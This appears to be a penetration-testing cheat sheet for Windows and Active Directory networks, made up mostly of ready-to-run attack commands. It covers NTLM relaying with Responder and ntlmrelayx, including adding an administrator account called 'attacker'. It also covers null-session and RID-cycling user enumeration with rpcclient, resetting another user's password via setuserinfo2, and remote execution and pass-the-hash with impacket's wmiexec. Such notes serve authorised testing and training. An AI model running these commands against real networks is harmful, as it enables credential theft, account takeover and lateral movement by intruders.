docs.title: Disable SMB in Responder to Avoid Collision
docs.text: sudo responder -I tun0 -wrf --disable-smb

docs.title: Start ntlmrelayx
docs.text: sudo ntlmrelayx.py -tf targets.txt -smb2support

docs.title: Relay to SMB, Add Admin User
docs.text: sudo ntlmrelayx.py -tf targets.txt --no-smb-signing --add-user attacker --passwd 'P@ssw0rd123' --group 'Administrators'

docs.title: Supported Relay Targets:
docs.text: Protocol Actions Available SMB File access, command exec, add user LDAP Dump domain info, modify AD objects HTTP Limited use; enumerate or exploit upload endpoints MSSQL Run SQL queries as authenticated user

docs.title: Advanced Configuration
docs.text:
Disable specific protocols in Responder.conf:

sudo mousepad /etc/responder/Responder.conf

[Responder Core]
SMB = Off
HTTP = On
FTP = Off
DNS = Off

Enable only what you need to avoid DoSing targets or triggering EDR.

docs.title: RPCClient — NetBIOS and SMB Enumeration Utility
docs.text:
Tip

Null session: rpcclient -U "" -N <target>. Useful commands: enumdomusers (user list), queryuser <rid> (user details), enumdomgroups (group list). RID cycling: for i in $(seq 500 1100); do rpcclient -U "" -N <target> -c "queryuser $i" 2>/dev/null | grep "User Name"; done.

docs.title: Syntax
docs.text:
rpcclient -U <user>%<password> <target>

Examples:

rpcclient -U "guest%" 10.10.10.10
rpcclient -U "john%Winter2023!" 10.10.10.10
rpcclient -N 10.10.10.10             # Null session

Once connected, you'll drop into an interactive shell where you can run rpcclient commands.

docs.title: 1. Enumerate Domain Users
docs.text:
enumdomusers

Output:

user:[Administrator] rid:[0x1f4]
user:[john] rid:[0x1f5]

To resolve a RID to a SID:

queryuser 0x1f4

docs.title: 2. Enumerate Domain Groups
docs.text:
enumdomgroups

Follow up with group info:

querygroup <RID>

docs.title: 3. SID Enumeration
docs.text:
You can enumerate known SIDs to resolve users:

lookupsids S-1-5-21-...-500

Or bruteforce SIDs for RID cycling:

for i in $(seq 500 550); do echo "S-1-5-21-XXXXXXX-XXXXXXX-XXXXXXX-$i" >> sids.txt; done
rpcclient -U "" <ip> -c "lookupsids $(cat sids.txt)"

docs.title: 4. Enumerate Share Information
docs.text:
netshareenum

List available shares, similar to smbclient -L.

docs.title: 5. Get Machine Info
docs.text:
getdompwinfo       # Domain password policy
getdcname .        # Domain Controller name
gethostname        # NetBIOS name of host

docs.title: 6. Dump Password Policy
docs.text:
getdompwinfo

Example output:

min password length: 7
password history length: 24
password properties: 0x00000000

docs.title: 7. Password Update
docs.text:
With the appropriate credentials, it may be possible to update another user's password:

setuserinfo2 MOLLY.SMITH 23 'Password1!'
Note: The 23 is the important tag. Reference this article.

docs.title: Example Workflow (Unauthenticated Enumeration)
docs.text:
rpcclient -U "" 10.10.10.10
> enumdomusers
> enumdomgroups
> getdompwinfo
> netshareenum
> getdcname .
> queryuser 0x1f4

If null sessions are disabled, test with valid credentials:

rpcclient -U "lowpriv%Winter2023!" 10.10.10.10

docs.title: Integration with Other Tools
docs.text:
• Pair with smbclient, enum4linux, or nmap scripts

  • Good alternative when smbclient fails or returns access denied

  • Use rpcclient + RID cycling to discover hidden users even if no enumeration is allowed

docs.title: Summary: rpcclient Enumeration
docs.text: Task Command Connect anonymously rpcclient -N <ip> Connect with creds rpcclient -U user%pass <ip> Enumerate users enumdomusers Enumerate groups enumdomgroups Get password policy getdompwinfo Lookup SIDs lookupsids <sid> Enumerate shares netshareenum Get DC hostname getdcname .

docs.title: WMIexec
docs.text:
Tip

impacket-wmiexec domain/user:pass@target gives a semi-interactive shell. For pass-the-hash: -hashes :NTLM. WMI execution leaves fewer traces than PSExec but still generates Event ID 4688 (process creation). Use with caution on monitored networks.

docs.title: Basic Usage
docs.text:
Run WMIexec with plaintext credentials:

wmiexec.py <username>@<target-ip>

Example:

wmiexec.py Administrator@192.168.1.10 -p 'Password123'

docs.title: Pass-the-Hash (PtH) with WMIexec
docs.text:
If you have an NTLM hash, you can use WMIexec without knowing the plaintext password:

wmiexec.py -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.1.10

docs.title: Executing Commands
docs.text:
Run PowerShell commands remotely:

wmiexec.py Administrator@192.168.1.10 -p 'Password123' "powershell -c Get-Process"

Retrieve system information:

wmiexec.py Administrator@192.168.1.10 -p 'Password123' "systeminfo"

Query network configuration:

wmiexec.py Administrator@192.168.1.10 -p 'Password123' "ipconfig /all"

docs.title: Interactive Shell Mode
docs.text:
WMIexec provides a semi-interactive shell but does not support full interactive sessions:

wmiexec.py Administrator@192.168.1.10 -p 'Password123'

docs.title: SMB Requirement
docs.text:
For WMIexec to work, SMB (port 445) must be open and the Admin$ share must be accessible. Verify using:

nmap -p 445 --open <target-ip>
